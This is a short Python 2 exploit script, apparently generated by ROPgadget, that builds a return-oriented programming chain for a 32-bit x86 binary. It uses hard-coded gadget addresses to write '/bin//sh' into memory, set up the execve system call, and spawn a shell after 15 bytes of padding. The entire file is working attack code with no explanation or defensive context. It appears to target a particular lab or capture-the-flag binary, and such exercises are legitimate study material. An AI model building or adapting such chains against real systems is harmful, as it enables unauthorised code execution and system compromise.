#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

def shell():
	# Padding goes here
	p = 'A'*15

	p += pack('<I', 0x0808413a) # pop edx ; ret
	p += pack('<I', 0x080ff060) # @ .data
	p += pack('<I', 0x080ccc86) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080acc6d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808413a) # pop edx ; ret
	p += pack('<I', 0x080ff064) # @ .data + 4
	p += pack('<I', 0x080ccc86) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080acc6d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808413a) # pop edx ; ret
	p += pack('<I', 0x080ff068) # @ .data + 8
	p += pack('<I', 0x0805ea90) # xor eax, eax ; ret
	p += pack('<I', 0x080acc6d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481e9) # pop ebx ; ret
	p += pack('<I', 0x080ff060) # @ .data
	p += pack('<I', 0x08084161) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ff068) # @ .data + 8
	p += pack('<I', 0x080ff060) # padding without overwrite ebx
	p += pack('<I', 0x0808413a) # pop edx ; ret
	p += pack('<I', 0x080ff068) # @ .data + 8
	p += pack('<I', 0x0805ea90) # xor eax, eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x08090b8f) # inc eax ; ret
	p += pack('<I', 0x080528f1) # int 0x80
        print p

shell()
